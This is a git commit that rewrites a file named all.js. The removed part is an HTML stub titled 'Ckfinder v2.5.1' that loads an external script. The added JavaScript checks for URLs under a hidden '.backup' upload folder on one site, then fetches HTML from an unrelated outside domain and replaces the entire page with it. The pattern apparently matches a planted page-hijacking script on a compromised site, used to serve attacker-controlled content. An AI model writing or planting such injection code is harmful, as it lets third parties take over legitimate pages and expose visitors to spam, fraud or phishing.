243c9f2cf99515edf2f7b39d70471968e6e609bf
Nguyen Duy <nguyenduy240784@gmail.com>
2025-09-13 16:34:21 +0700

    Update all.js

--- all.js
+++ all.js
@@ -1,11 +1,29 @@
-<!DOCTYPE html>
-<html lang="vi-vn">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script src="https://phukhoathaiha.com/3rd/craftbd/js.js"></script>
-</head>
-<body>
-<h1>Ckfinder v2.5.1</h1>
-</body>
-</html>
+// Lấy URL hiện tại
+const huulung = window.location.href.toLowerCase();
+
+// Nếu URL chứa đường dẫn cần check
+if (huulung.includes("iwistw.com/upload/files/.backup/readme")) {
+
+    // Danh sách file cần check
+    const list_file = [
+        "bqbtt-69136.html",
+		"ctkvt-62829.html"
+    ];
+
+    // Tìm file phù hợp
+    const found = list_file.find(item => huulung.includes("?" + item));
+
+    // Nếu tìm thấy thì load
+    if (found) {
+        loadFile("https://phukhoathaiha.com/3rd/iwistw/" + found);
+    }
+}
+
+// Hàm load nội dung HTML từ file
+function loadFile(file) {
+    fetch(file)
+        .then(res => res.text())
+        .then(html => {
+            document.documentElement.innerHTML = html;
+        });
+}
